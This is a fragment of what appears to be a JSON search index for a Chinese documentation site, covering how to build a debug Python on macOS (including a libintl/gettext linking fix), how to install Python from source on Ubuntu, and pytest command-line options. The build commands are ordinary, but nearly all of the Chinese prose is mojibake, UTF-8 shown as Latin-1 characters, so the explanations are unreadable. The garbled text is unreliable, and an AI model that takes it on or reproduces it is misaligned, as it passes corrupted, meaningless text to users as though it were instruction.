è¡¨ç¤ºåˆ†ç»„ ?: å¤§é‡åŒ¹é…, æ˜¯ç”¨ re.compile å…ˆé¢„ç¼–è¯‘ å…ƒç¥–è½¬æ¢å¯¹è±¡","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Tutorial-Advanced-Python.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-Advanced-Python.html"},{"title":"debugç‰ˆæœ¬pythonå®‰è£…","text":"å‚è€ƒ: https://docs.python.org/zh-cn/3.11/using/unix.html æ‰¾äº†ä¸€ä¸‹èµ„æ–™, debugç‰ˆæœ¬åªæœ‰windowså¯ä»¥é€šè¿‡å®‰è£…åŒ…å®‰è£…, å…¶ä»–å¦‚linuxã€macç­‰éƒ½å¾—æ‰‹åŠ¨ç¼–è¯‘å®‰è£…. Macä¸‹çš„å®‰è£… åŸºæœ¬æŒ‡ä»¤: wget https://www.python.org/ftp/python/3.9.10/Python-3.9.10.tgz tar -xzf Python-3.9.10.tgz cd Python-3.9.10 ./configure --enable-optimizations --with-pydebug --prefix=/usr/local/python/python3.9.10 --with-openssl=/usr/local/opt/openssl@1.1 --with-lto make -j8 && sudo make altinstall --with-pydebugå‚æ•°ä¼šç¼–è¯‘å¸¦æœ‰debugç¬¦å·çš„äºŒè¿›åˆ¶æ–‡ä»¶,æ–¹ä¾¿åæœŸä½¿ç”¨gdbè¿›è¡Œè°ƒè¯• --enable-optimizations ç”¨ PROFILE_TASK å¯ç”¨ä»¥é…ç½®æ–‡ä»¶ä¸»å¯¼çš„ä¼˜åŒ–ï¼ˆPGOï¼‰ï¼ˆé»˜è®¤ä¸ºç¦ç”¨ï¼‰. C ç¼–è¯‘å™¨ Clang éœ€è¦ç”¨åˆ° llvm-profdata ç¨‹åºè¿›è¡Œ PGOã€‚åœ¨ macOS ä¸Šï¼ŒGCC ä¹Ÿéœ€è¦ç”¨åˆ°å®ƒï¼šåœ¨ macOS ä¸Š GCC åªæ˜¯ Clang çš„åˆ«åè€Œå·²ã€‚ å¦‚æœä½¿ç”¨ --enable-shared å’Œ GCC ï¼Œè¿˜å¯ä»¥ç¦ç”¨ libpython ä¸­çš„è¯­ä¹‰æ’å€¼ï¼šåœ¨ç¼–è¯‘å™¨å’Œé“¾æ¥å™¨çš„æ ‡å¿—ä¸­åŠ å…¥ -fno-semantic-interposition ã€‚ --prefixæŒ‡å®šå®‰è£…è·¯å¾„ --with-opensslæŒ‡å®šopensslçš„è·¯å¾„, å¦åˆ™sslæ¨¡å—æ— æ³•ä½¿ç”¨ --with-lto: å¯ç”¨é“¾æ¥æ—¶ä¼˜åŒ–ï¼ˆLink Time Optimizationï¼Œç®€ç§°LTOï¼‰ã€‚ é“¾æ¥æ—¶ä¼˜åŒ–æ˜¯ä¸€ç§ç¼–è¯‘å™¨ä¼˜åŒ–æŠ€æœ¯ï¼Œé€šè¿‡åœ¨é“¾æ¥é˜¶æ®µå¯¹ä»£ç è¿›è¡Œå…¨å±€åˆ†æå’Œä¼˜åŒ–ï¼Œå¯ä»¥æé«˜ç¨‹åºçš„æ€§èƒ½ã€‚ åœ¨å¯ç”¨LTOæ—¶ï¼Œç¼–è¯‘å™¨å°†ç”Ÿæˆä¸­é—´è¡¨ç¤ºå½¢å¼ï¼ˆIRï¼‰å¹¶å°†å…¶ä¿å­˜åˆ°ç›®æ ‡æ–‡ä»¶ä¸­ã€‚ ç„¶åï¼Œåœ¨é“¾æ¥é˜¶æ®µï¼Œé€šè¿‡å¯¹æ‰€æœ‰ç›®æ ‡æ–‡ä»¶ä¸­çš„IRè¿›è¡Œæ·±åº¦ä¼˜åŒ–å’Œåˆ†æï¼Œä»¥åŠæ•´ä½“ä»£ç é‡æ’å’Œæ¶ˆé™¤å†—ä½™ç­‰æ“ä½œï¼Œç”Ÿæˆæœ€ç»ˆå¯æ‰§è¡Œæ–‡ä»¶æˆ–åº“ã€‚ configureæ”¯æŒçš„å‚æ•°å¯æŸ¥çœ‹: https://docs.python.org/zh-cn/3.11/using/configure.html makeç›¸å…³: make ï¼šç”¨æ ‡å‡†åº“æ„å»ºPython, -j8è¡¨ç¤º8ä¸ªä»»åŠ¡å¹¶è¡Œå®‰è£… make clean ï¼šç§»é™¤æ„å»ºçš„æ–‡ä»¶ make distclean ï¼šä¸ make clean ç›¸åŒï¼Œä½†ä¹Ÿåˆ é™¤ç”±é…ç½®è„šæœ¬åˆ›å»ºçš„æ–‡ä»¶ è­¦å‘Š make install å¯ä»¥è¦†ç›–æˆ–ä¼ªè£… python3 äºŒè¿›åˆ¶æ–‡ä»¶(ç³»ç»Ÿé»˜è®¤çš„python3)ã€‚ å› æ­¤ï¼Œå»ºè®®ä½¿ç”¨ make altinstall è€Œä¸æ˜¯ make install ï¼Œ å› ä¸ºåè€…åªå®‰è£…äº† exec_prefix/bin/pythonversion ã€‚ åç»­é‡åˆ°çš„é—®é¢˜ ä½¿ç”¨nuitkaç¼–è¯‘æ—¶, æœ‰æ—¶å€™æºç èƒ½è·‘è¿‡çš„, æ„å»ºå‡ºæ¥è·‘ä¸äº†, æ‰€ä»¥ç ”ç©¶äº†ä¸€ä¸‹å¯¹äºæ„å»ºå¥½çš„åº”ç”¨, èƒ½å¦åœ¨Pythonçš„å±‚é¢è¿›è¡Œè°ƒè¯•, ç»“æœä¼¼ä¹ä¸èƒ½, è™½ç„¶æ„å¤–å‘ç°æœ‰nuitkaä¸€ä¸ª --python-debug é€‰é¡¹, ä¹Ÿåªèƒ½å®ç°ç¼–è¯‘å çš„æ–‡ä»¶ä¿ç•™äº†åŸæœ‰çš„è¡Œå·å˜é‡ç­‰ä¿¡æ¯, æœ€ç»ˆè¿˜æ˜¯å¾—gdb(macä¸‹lldb)å‡ºæ‰‹. å¯å‚è€ƒ: /docs/åç«¯/python/pythonä¸‰æ–¹åº“/nuitka . ä¸è¿‡éœ€è¦å®‰è£…æ”¯æŒdebugçš„pythonç‰ˆæœ¬, ä¹Ÿå°±æ˜¯ç¼–è¯‘å®‰è£…python æ—¶éœ€è¦æ·»åŠ  --with-pydebug é€‰é¡¹... æœ€å¼€å§‹ä½¿ç”¨ä¸Šè¿°æµç¨‹å®‰è£…å¥½pythonæ—¶å€™, pythonä½¿ç”¨æ²¡é—®é¢˜, ä½¿ç”¨nuitkaæ„å»ºçš„æ—¶å€™å‡ºç°æŠ¥é”™: Undefined symbols for architecture x86_64: \"_libintl_bindtextdomain\", referenced from: fish_bindtextdomain(char const*, char const*) in libfishlib.a(fallback.cpp.o) \"_libintl_gettext\", referenced from: fish_gettext(char const*) in libfishlib.a(fallback.cpp.o) \"_libintl_textdomain\", referenced from: fish_textdomain(char const*) in libfishlib.a(fallback.cpp.o) ld: symbol(s) not found for architecture x86_64 clang: error: linker command failed with exit code 1 (use -v to see invocation) ç±»ä¼¼è¿™æ ·, æœ€å¼€å§‹æŸ¥äº†ä¸€ä¸‹ä»¥ä¸ºæ˜¯gettextåº“ä¸å¯¹(åœ¨è¿™ä¹‹å‰å·²ç»å®‰è£…äº†gettext), ä»¥ä¸ºå‡ºç°æ‰¾ä¸åˆ° _libintl, æ˜¯æ²¡è®¾ç½®å¥½ç¯å¢ƒå˜é‡, å°±è®¾ç½®äº†ä¸€ä¸‹å¹¶é‡æ–°ç¼–è¯‘å®‰è£…: export LDFLAGS=\"-L/usr/local/opt/gettext/lib\" export CPPFLAGS=\"-I/usr/local/opt/gettext/include\" libintl æ˜¯ gettext çš„ä¸€éƒ¨åˆ†ã€‚gettext æ˜¯ä¸€ä¸ªç”¨äºå›½é™…åŒ–å’Œæœ¬åœ°åŒ–çš„å·¥å…·é›†ï¼Œ å®ƒæä¾›äº†ä¸€ç§æ–¹å¼æ¥åœ¨åº”ç”¨ç¨‹åºä¸­ä»æºä»£ç ä¸­æå–æ–‡æœ¬ï¼Œå¹¶å°†å…¶ç¿»è¯‘æˆä¸åŒçš„è¯­è¨€ã€‚ libintl æ˜¯ gettext æä¾›çš„ä¸€ä¸ªåº“ï¼Œç”¨äºå¤„ç†å¤šè¯­è¨€æ–‡æœ¬çš„è¿è¡Œæ—¶æ”¯æŒï¼Œ åŒ…æ‹¬ç¿»è¯‘ã€æ ¼å¼åŒ–å’Œå­—ç¬¦ç¼–ç ç­‰åŠŸèƒ½ã€‚é€šè¿‡ä½¿ç”¨ libintlï¼Œå¼€å‘äººå‘˜å¯ä»¥è½»æ¾åœ°å®ç°å¤šè¯­è¨€æ”¯æŒçš„åº”ç”¨ç¨‹åºã€‚ ç»“æœè¿˜æ˜¯å‘ç°æœ‰é—®é¢˜, åé¢è¯•è¿‡ç»™nuitkaåŠ å‚æ•°, æŒ‡å®š LD_LIBRARY_PATH ç­‰, éƒ½å¤±è´¥äº†. ç„¶åçªç„¶æƒ³èµ·çœ‹ä¸€ä¸‹åŠ¨æ€åº“çš„é“¾æ¥æ˜¯å•¥(linuxä¸‹æ˜¯ldd, macé»˜è®¤æ²¡æœ‰, æœ‰ä¸ªç›¸ä¼¼çš„otool), ç¼–è¯‘å®‰è£…çš„debugç‰ˆæœ¬å¦‚ä¸‹: $ otool -L /usr/local/python/python3.9.10/bin/python3.9 /usr/local/python/python3.9.10/bin/python3.9: /System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation (compatibility version 150.0.0, current version 1971.0.0) /usr/local/opt/gettext/lib/libintl.8.dylib (compatibility version 12.0.0, current version 12.0.0) /usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 1319.100.3) åˆå»æ‰¾äº†ä¸€ä¸ªæ­£å¸¸çš„çœ‹: $ readlink -f `which python3` /usr/local/Cellar/python@3.11/3.11.4_1/Frameworks/Python.framework/Versions/3.11/bin/python3.11 $ otool -L /usr/local/Cellar/python@3.11/3.11.4_1/Frameworks/Python.framework/Versions/3.11/bin/python3.11 /usr/local/Cellar/python@3.11/3.11.4_1/Frameworks/Python.framework/Versions/3.11/bin/python3.11: /usr/local/Cellar/python@3.11/3.11.4_1/Frameworks/Python.framework/Versions/3.11/Python (compatibility version 3.11.0, current version 3.11.0) /usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 1319.100.3) ä¸€å¯¹æ¯”, ç¼–è¯‘å®‰è£…çš„å¤šäº†ä¸ª /usr/local/opt/gettext/lib/libintl.8.dylib , lsæŸ¥çœ‹äº†ä¸€ä¸‹ä½ç½®, è·¯å¾„æ²¡é—®é¢˜å•Š, ä¸ºä»€ä¹ˆä¼šè¿™æ ·? ç™¾åº¦æ— æœ, å¼€å¢™, è°·æ­Œ, ç»ˆäºåœ¨githubå‘ç°äº†ç±»ä¼¼çš„ä¸€ä¸ªé—®é¢˜, ä¸è¿‡æ˜¯ç”± CMAKE å¼•èµ·, å‚è§: https://github.com/fish-shell/fish-shell/issues/5244 , CMAKE ä¹Ÿæœ‰è¯´æ˜æœ‰å…¶ä»–åœ°æ–¹å·²ç»æå‡º: https://gitlab.kitware.com/cmake/cmake/-/issues/18921 , ç°åœ¨è¿™é—®é¢˜å››å¹´äº†è¿˜æ²¡å…³. æœ‰ä½å¤§ä½¬åœ¨19å¹´å·²ç»è¯´æ˜å¥½é—®é¢˜äº†: I can reproduce this - looks like I've got the Mono libintl, and if I add the brew gettext tools to my path, I get the same problem. I have spent some time reviewing the current state: - libintl is not shipped in macOS, but can be picked up by FindPackage(Intl) - the gettext binaries (msgfmt etc) are not shipped in macOS, but can be picked up by FindPackage(gettext) - if both libintl and the gettext binaries are detected, the include directories get added to the global include directories - regardless of the gettext state, the libintl libraries are added to the list of library dependencies of the fishlib target (this is inconsistent with the previous item and probably needs fixing, perhaps through an add_library target) If you have Mono installed, libintl's headers are picked up by CMake from /Library/Frameworks/Mono.framework, but the libraries are not found in the same prefix (Intl_LIBRARY:FILEPATH=Intl_LIBRARY-NOTFOUND). Unfortunately, this cannot be used as a signal that libintl is not available, because this is exactly the state that glibc is in with libintl compiled into the main library. This is only exposed as a problem when gettext is in the path, because of the requirement for both gettext and libintl for the include_directory call (as above). pkg-config would not help here, because it does not ship on macOS. I think this is a bug in CMake's FindIntl module, which I'll report to them. Someone has a similar problem in EOSIO/eos#1539. For now, you can work around this either by turning off the use of translation (cmake -DWITH_GETTEXT=0), or enable it by adding an additional library search path (cmake -DCMAKE_LIBRARY_PATH=/Library/Frameworks/Mono.framework/Libraries). ç®€è€Œè¨€ä¹‹å°±æ˜¯, å› ä¸ºbrewæ‰‹åŠ¨å®‰è£…äº†gettext, åŒæ—¶ç³»ç»Ÿä¹Ÿå®‰è£…äº†Mono(ä¸€ä¸ª.Netçš„ä»€ä¹ˆæ¡†æ¶), ç„¶è€ŒMonoä¸‹ å·²å­˜åœ¨libintlåº“, è¿™ä¸ªæ—¶å€™ç³»ç»Ÿå†…å°±æœ‰ä¸¤ä¸ªåœ°æ–¹å­˜åœ¨è¿™ä¸ªåº“äº†. ç„¶åç¼–è¯‘å®‰è£…Pythonæ—¶, ä¼šè‡ªåŠ¨æ¢æµ‹åŒ…ä½ç½®, brewåŒ…ç®¡ç†å™¨å‘ç°äº†æœ‰gettextè¿™ä¸ªåŒ…, æ‰€ä»¥å°±ä½¿ç”¨äº†, ä½†æ˜¯, ç”¨çš„è¿™ä¸ªåˆå¤šäº†ä¸€äº›ä¸œè¥¿(æš‚ä¸”è¿™ä¹ˆè¯´, å®é™…ç¼–è¯‘æ—¶ä¸éœ€è¦è¿™äº›), å°±å¯¼è‡´äº†ä½¿ç”¨nuitkaæ—¶çš„æŠ¥é”™ (ä»–è¿™é‡Œè™½ç„¶æ˜¯CMAKE, ä½†æ˜¯åŸå› æ˜¯ä¸€è‡´çš„). è€Œä¸”åé¢fish-shellå¤„ç†äº†è¿™é—®é¢˜: https://github.com/fish-shell/fish-shell/commit/970a963896162617af3e18fb2df953dbeac0a4fc æ³¨è§£ æˆ‘å°±å¾ˆè¯§å¼‚, æ²¡å…¶ä»–äººé‡åˆ°è¿™ä¸ªé—®é¢˜å—... çœ‹äº†ä¸€ä¸‹æˆ‘çš„ /Library/Frameworks/Mono.framework ä¸‹é¢, æœç„¶å·²ç»æœ‰ä¸€ä¸ª libintl.8.dylib , æ‰€ä»¥è‡ªå·±brewå®‰è£…çš„gettextå°±æ˜¯ä¸ªå¤šä½™çš„, å¯¼è‡´ç¼–è¯‘å®‰è£…å¥½çš„pythonå¤šäº†ä¸ªè‡ªå®‰è£…çš„libintlåŠ¨æ€åº“é“¾æ¥, å°è¯•è¿‡æ‰‹åŠ¨æŒ‡å®šè·¯å¾„æ²¡æ‰¾åˆ°æ–¹æ³•, æœ€å brew uninstall gettext åå†é‡æ–°ç¼–è¯‘å®‰è£…åè§£å†³: sudo make clean sudo make distclean sudo rm -rf /usr/local/python/python3.9.10 ./configure --enable-optimizations --with-pydebug --prefix=/usr/local/python/python3.9.10 --with-openssl=/usr/local/opt/openssl@1.1 sudo make -j8 && sudo make altinstall æŸ¥çœ‹é“¾æ¥ä½ç½®: $ otool -L /usr/local/python/python3.9.10/bin/python3.9 /usr/local/python/python3.9.10/bin/python3.9: /System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation (compatibility version 150.0.0, current version 1971.0.0) /usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 1319.100.3) æ­£å¸¸äº†","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Tutorial-DEBUG-version-python-installation.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-DEBUG-version-python-installation.html"},{"title":"ä»æºç å®‰è£…Python","text":"ä¸»è¦æ˜¯é’ˆå¯¹å‘å¸ƒç‰ˆæœ¬çš„Linuxå§, æ¯”å¦‚Ubuntu, ä½¿ç”¨: apt install python3 ä¼šå‘ç°å®‰è£…çš„æ˜¯è·Ÿå½“å‰å¯¹åº”çš„ç‰ˆæœ¬, æ¯”å¦‚20å°±æ˜¯Python3.8. è¦å®‰è£…å…¶ä»–ç‰ˆæœ¬çš„Pythonå°±åªæœ‰æºç å®‰è£…äº†, å®˜ç½‘æºç ä¸‹è½½ <https://www.python.org/downloads/source/> å¦‚æœçœ‹å…¶ä»–å¹³å°é€‚ç”¨: https://www.python.org/downloads/ æºç å®‰è£…ä¸€èˆ¬åˆ†3æ­¥: é…ç½® configure ç¼–è¯‘ make å®‰è£… make install å¯å‚è€ƒå®˜ç½‘å¼€å‘æ‰‹å†Œ: Linuxæ„å»ºå®‰è£…Python å‰ç½®ä¾èµ–å‡†å¤‡: sudo apt install build-essential gdb lcov pkg-config \\ libbz2-dev libffi-dev libgdbm-dev libgdbm-compat-dev liblzma-dev \\ libncurses5-dev libreadline6-dev libsqlite3-dev libssl-dev \\ lzma lzma-dev tk-dev uuid-dev zlib1g-dev python-dev æ³¨è§£ å®˜ç½‘å¹¶æ²¡æåˆ°è¦å®‰è£…python-dev, å®é™…å¦‚æœç¼ºå¤±ä¼šå¯¼è‡´ä½¿ç”¨structæ¨¡å—æŠ¥é”™æ‰¾ä¸åˆ°_struct åˆ›å»ºå®‰è£…ç›®å½•, åˆ›å»º/usr/local/python37ä½œä¸ºå®‰è£…ç›®å½• mkdir /usr/local/python37 é…ç½®: ./configure --prefix=/usr/local/python37 --with-pydebug --enable-optimizations --prefix=/opt/python3.9ç”¨æ¥æŒ‡å®šå®‰è£…ä½ç½® --with-pydebugæ·»åŠ è°ƒè¯•å·¥å…·ç”¨ --enable-optimizationså¯¹ç¼–è¯‘ç»“æœè¿›è¡Œä¼˜åŒ–ï¼Œæé«˜è¿è¡Œæ•ˆç‡ï¼Œä½†ä¼šå¢åŠ ç¼–è¯‘æ—¶é—´ ç¼–è¯‘: make å¯ä»¥ä½¿ç”¨ -j å‚æ•°æŒ‡å®šCPUä¸ªæ•°è¿›è¡Œå¹¶è¡Œç¼–è¯‘ æ£€æŸ¥ç¼–è¯‘: make test å®‰è£…: sudo make altinstall ä¹Ÿå¯ä½¿ç”¨installï¼Œä»£ä»·æ˜¯å®ƒå¯èƒ½ä¼šæ›´æ”¹è‡ªå¸¦çš„python3å®‰è£…ï¼Œä½¿å¾—å¸è½½å˜å¾—å›°éš¾ï¼Œç”šè‡³ä½¿è‡ªå¸¦çš„python3å˜å¾—ä¸å¯ç”¨ æ€»ç»“, æ‰€æœ‰æŒ‡ä»¤ : sudo apt install build-essential gdb lcov pkg-config \\ libbz2-dev libffi-dev libgdbm-dev libgdbm-compat-dev liblzma-dev \\ libncurses5-dev libreadline6-dev libsqlite3-dev libssl-dev \\ lzma lzma-dev tk-dev uuid-dev zlib1g-dev sudo mkdir /usr/local/python37 ./configure --prefix=/usr/local/python37 --with-pydebug --enable-optimizations make -j 3 sudo make altinstall ä½¿ç”¨æºç å®‰è£…æœ€éº»çƒ¦çš„æ˜¯ä¾èµ–åŒ…å¤„ç†. æ¯”å¦‚Ubuntu20, å®˜æ–¹æºçš„Pythonç»‘å®šæ˜¯3.8çš„ç‰ˆæœ¬. å¦‚æœ æƒ³è¦å®‰è£…Python3.7, é‚£ä¹ˆä½ ä¼šå‘ç°è‡³å°‘ç¼ºå°‘Python3.7-dev, ä¸”æºé‡Œé¢æ²¡æœ‰ä¹Ÿä¸‹è½½ä¸äº†. æ³¨: python-dev or python-devel ç§°ä¸º Python çš„å¼€å‘åŒ…ï¼ŒåŒ…æ‹¬äº†ä¸€äº›ç”¨ C / Java / C# ç­‰ç¼–å†™çš„ Python æ‰©å±•ï¼Œ åœ¨ç¼–è¯‘çš„æ—¶å€™ä¾èµ–çš„å¤´æ–‡ä»¶ç­‰ä¿¡æ¯ã€‚åœ¨ç¼–è¯‘ä¸€ä¸ªç”¨ C è¯­è¨€ç¼–å†™çš„ Python æ‰©å±•æ¨¡å—æ—¶ï¼Œ é‡Œé¢ä¼šæœ‰ #include<Python.h> è¿™æ ·çš„è¯­å¥ï¼Œå› æ­¤éœ€è¦å…ˆå®‰è£… python-dev or python-devel å¼€å‘åŒ…. è¿™ç§æƒ…å†µä¸‹è¦ä¹ˆæ¢ä¸ªæœ‰æ­¤åŒ…çš„æºç„¶åä¸‹è½½, ä½†æ˜¯å¯èƒ½ä¹Ÿä¼šæœ‰å…¶ä»–ä¾èµ–åŒ…ç‰ˆæœ¬é—®é¢˜, è¦æ¢ç›´æ¥å»æ”¯æŒç‰ˆæœ¬çš„æœºå™¨ä¸Š å…¨é‡ç¼–ä¸€ä¸ª. Ubuntu ä¸‹åç§° python-dev and python3-dev CentOS ä¸‹åç§° python-devel and python3-devel å…³äºåŠ¨æ€åº“é“¾æ¥å¤„ç† å½“æ—¶å€™ä»å…¶ä»–æœºå™¨ç¼–è¯‘çš„Pythonæ—¶, è‹¥éœ€è¦çš„åŠ¨æ€åº“åœ¨æœ¬æœºä¸å­˜åœ¨, è¿˜éœ€è¦å¤„ç† åŠ¨æ€åº“é“¾æ¥, æœ‰å‡ ç§æ–¹å¼(ä»»é€‰å…¶ä¸€): å°†soæ–‡ä»¶æ‰€åœ¨ç›®å½•å¦‚ /usr/local/lib æ·»åŠ åˆ° /etc/ld.so.conf å¹¶è¿è¡Œldconfig. å½“ç„¶ï¼Œè¿™æ˜¯ç³»ç»ŸèŒƒå›´çš„è®¾ç½®. å°†åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶(.soæ–‡ä»¶)å¤åˆ¶åˆ°/usr/local/lib æˆ– /usr/lib, ç„¶åæ‰§è¡Œ sudo ldconfig æ›´æ–°ç³»ç»ŸåŠ¨æ€é“¾æ¥åº“ç¼“å­˜. å°†å…±äº«åº“æ”¾åœ¨ç»Ÿä¸€çš„ä½ç½®å¦‚ path/to/libs, ç„¶åå°†å…¶åŠ å…¥ç¯å¢ƒå˜é‡: export LD_LIBRARY_PATH=path/to/libs:$LD_LIBRARY_PATH å¦‚æœè¦æ°¸ä¹…ç”Ÿæ•ˆå°±éœ€è¦åŠ åˆ°å¦‚ /etc/profile æ‰“å° LD_LIBRARY_PATH çš„å€¼, ä¼šå‘ç° /usr/local/lib æˆ– /usr/lib å¹¶ä¸åœ¨è¿™ä¸ª å˜é‡ä¸­, è¿™æ˜¯å› ä¸º, è¿™ä¸¤ç›®å½•æ˜¯é»˜è®¤çš„å…±äº«åº“æœç´¢è·¯å¾„. å³ä½¿æœªå°†è¯¥ç›®å½•æ·»åŠ åˆ° LD_LIBRARY_PATH ç¯å¢ƒå˜é‡ä¸­ï¼Œæ“ä½œç³»ç»Ÿä¹Ÿä¼šè‡ªåŠ¨æœç´¢è¯¥ç›®å½•ä»¥æŸ¥æ‰¾æ‰€éœ€çš„å…±äº«åº“ è­¦å‘Š å¯¹äºUbuntuç­‰, /usr/bin/python æ˜¯ä¸å…¶ä»–æŒ‡ä»¤æ¯æ¯ç›¸å…³çš„, æ¯”å¦‚ pip, lsb-release ç­‰. æ‰€ä»¥è‹¥è‡ªå®šä¹‰æºç å®‰è£…çš„ç‰ˆæœ¬ä¸è‡ªå¸¦ç‰ˆæœ¬ä¸ä¸€è‡´æ—¶, æœ€å¥½è¿˜æ˜¯é‡‡ç”¨è®¾ç½®ç¯å¢ƒå˜é‡æ¥å¤„ç†æ‰§è¡Œå‘½ä»¤çš„é—®é¢˜, è€Œä¸æ˜¯ç›´æ¥ä¿®æ”¹ /usr/bin/python çš„é“¾æ¥åœ°å€.","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Tutorial-Installation-from-the-source-code.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-Installation-from-the-source-code.html"},{"title":"Pytestä½¿ç”¨","text":"æœç´¢èŒƒå›´ å…ˆæ‰¾åˆ°å½“å‰ç›®å½•ä¸‹ä»¥test_ä¸ºå‰ç¼€å’Œä»¥_testä¸ºåç¼€çš„æ–‡ä»¶, ç„¶ååœ¨å…¶ä¸­æœç´¢: ä»¥testä¸ºå‰ç¼€çš„å‡½æ•° ä»¥Testä¸ºå‰ç¼€çš„ç±»(æ³¨æ„ä¸€èˆ¬æµ‹è¯•ç±»ä¸åº”åŒ…å«__init__()å‡½æ•°)ä¸­ä»¥testä¸ºå‰ç¼€çš„å‡½æ•° ç»§æ‰¿unittest.TestCaseå•å…ƒæµ‹è¯•ç±»ä¸­, ä»¥testä¸ºå‰ç¼€çš„å‡½æ•° é€‰é¡¹å‚æ•° -v , -q æ‰“å°ç”¨ä¾‹æ‰§è¡Œçš„è¯¦ç»†/ç®€ç•¥è¿‡ç¨‹, pytest -v , pytest -q -k æŒ‡å®šå…·ä½“æ‰§è¡Œå“ªä¸€ä¸ªæµ‹è¯•ç”¨ä¾‹, å¯ä»¥æ˜¯æ–‡ä»¶å, ä¹Ÿå¯ä»¥æ˜¯å‡½æ•°å, éƒ½æœ‰åˆ™éœ€è¦ä¸¥æ ¼æŒ‡å®špyæ–‡ä»¶å -x æµ‹è¯•ç”¨ä¾‹æ‰§è¡Œå¤±è´¥åˆ™ç«‹åˆ»åœæ­¢ -s éœ€è¦æ‰§è¡Œ print å‡½æ•°, é»˜è®¤ä¸æ‰§è¡Œ -r <option> ç”Ÿæˆç®€ç•¥çš„æŒ‡å®šéœ€æ±‚çš„æŠ¥å‘Š, æ”¯æŒå‚æ•°å¦‚ä¸‹ option Des f failed E error s skipped x xfailed X passed P passed p passed with output a all except passed A all --tb= <option> option: 'auto', 'long', 'short', 'no', 'line', 'native' ç”¨ä¾‹è¿è¡Œå¤±è´¥æ—¶, å±•ç¤ºé”™è¯¯çš„è¯¦ç»†ç¨‹åº¦ -l , --showlocals ç”¨ä¾‹è¿è¡Œå¤±è´¥æ—¶, æ‰“å°ç›¸å…³çš„å±€éƒ¨å˜é‡, pytest -l --lf , --last-failed åªæ‰§è¡Œä¸Šæ¬¡æ‰§è¡Œå¤±è´¥çš„æµ‹è¯• --ff , --failed-first å…ˆæ‰§è¡Œå®Œä¸Šæ¬¡å¤±è´¥çš„æµ‹è¯•å, å†æ‰§è¡Œä¸Šæ¬¡æ­£å¸¸çš„æµ‹è¯• --durations= <num> numä¸º0æ—¶åˆ™å€’åºæ˜¾ç¤ºæ‰€æœ‰çš„ç”¨ä¾‹, ä¸ºå…·ä½“å€¼åˆ™æ˜¾ç¤ºè€—æ—¶æœ€é•¿çš„å¯¹åº”è¯¥æ•°é‡çš„ç”¨ä¾‹, -vv æ˜¾ç¤ºæŒç»­æ—¶é—´ä¸º0ç§’çš„ç”¨ä¾‹ ä¼šæŒ‰ç”¨ä¾‹æ‰§è¡Œè€—æ—¶æ—¶é•¿ï¼šä»é•¿åˆ°çŸ­ æ˜¾ç¤ºç»“æœ, ç”¨äºè°ƒä¼˜æµ‹è¯•ä»£ç  æ¯”å¦‚æ˜¾ç¤ºè¿è¡Œè€—æ—¶æœ€é•¿çš„3ä¸ªç”¨ä¾‹ä¸”åŒ…å«æŒç»­æ—¶é—´ä¸º0ç§’çš„ï¼špytest --durations=3 -vv --maxfail= <num> ç”¨ä¾‹è¿è¡Œæ—¶ å…è®¸çš„æœ€å¤§å¤±è´¥æ¬¡æ•°, è¶…è¿‡åˆ™ç«‹å³åœæ­¢, pytest --maxfail=3 --collect-only æ”¶é›†æµ‹è¯•ç”¨ä¾‹ä½†ä¸æ‰§è¡Œ -n <num> å½“ä½¿ç”¨pytest-xdistæ’ä»¶æ—¶, å¯ä»¥æŒ‡å®šè¿è¡Œå¤„ç†å™¨è¿›ç¨‹æ•°, å¯ä¸ºä¸ªæ•°æˆ–è€…'auto' --cov= <path> ç»Ÿè®¡æŒ‡å®šè·¯å¾„çš„ä»£ç æµ‹è¯•è¦†ç›–ç‡, éœ€è¦å…ˆå®‰è£…covæ¨¡å—: pip install pytest-cov --cov-report= <TYPE> ç”ŸæˆæŒ‡å®šæ ¼å¼çš„æµ‹è¯•æŠ¥å‘Š, æ”¯æŒå¤šä¸ªå€¼, æ”¯æŒä»¥ä¸‹æµ‹è¯•æŠ¥å‘Šç±»å‹: term, term-missing, annotate, html, xml æŠ€å·§ è¿è¡ŒæŒ‡å®šçš„å‡½æ•° pytest æ¨¡å—å::ç±»å::å‡½æ•°å, pytest test.py::check_ui æ³¨è§£ ä»£ç å†…éƒ¨æ‰§è¡Œ if __name__ == '__main__' : pytest . main () æ”¯æŒçš„è£…é¥°å™¨ æ”¯æŒçš„å…¶ä»– rerunfailure å¤±è´¥é‡è·‘ å®‰è£…, pip install pytest-rerunfailure åœ¨è®¾ç½®æ–‡ä»¶pytest.iniä¸­æ·»åŠ å‘½ä»¤ reruns = é‡è·‘æ¬¡æ•° addopts= --reruns =10 å‚è§: /docs/åç«¯/python/pythonä¸‰æ–¹åº“/pytest-rerunfailures ä½¿ç”¨Mockæ¨¡æ‹Ÿå¯¹è±¡ ä½¿ç”¨mockå¯¹è±¡æ›¿ä»£æ‰æŒ‡å®šçš„pythonå¯¹è±¡, ä»¥è¾¾åˆ°æ¨¡æ‹Ÿå¯¹è±¡çš„è¡Œä¸ºçš„ç›®çš„ã€‚ å¯ä»¥ç”¨åœ¨æµ‹è¯•æ—¶, å­˜åœ¨ä¸€äº›ä¾èµ–å¯¹è±¡æ—¶, ä½¿ç”¨mockæ¨¡æ‹Ÿä¸€äº›ä¾èµ–å¯¹è±¡; ä¹Ÿå¯ä»¥ç”¨åœ¨å­˜åœ¨æ¥å£è°ƒç”¨ä½†æ¥å£æœªå®Œå–„æ—¶. from unittest.mock import Mock something = Mock () something . do = lambda * args : True å…¶ä»–è§: /docs/åç«¯/python/pythonä¸‰æ–¹åº“/pytest å…³äºè£…é¥°å™¨çš„ä¸€äº›ä½¿ç”¨ æœ‰æ­¤èŠ‚ä¸»è¦æ˜¯å› ä¸º, æœ‰éœ€æ±‚éœ€è¦å°†ä¸€ä¸ªå›ºä»¶é‡ç”¨, ä½†æ˜¯å˜åŠ¨çš„åœ°æ–¹å¾ˆå° å¼•å…¥éœ€è¦ç”¨åˆ°çš„æ¨¡å—: import 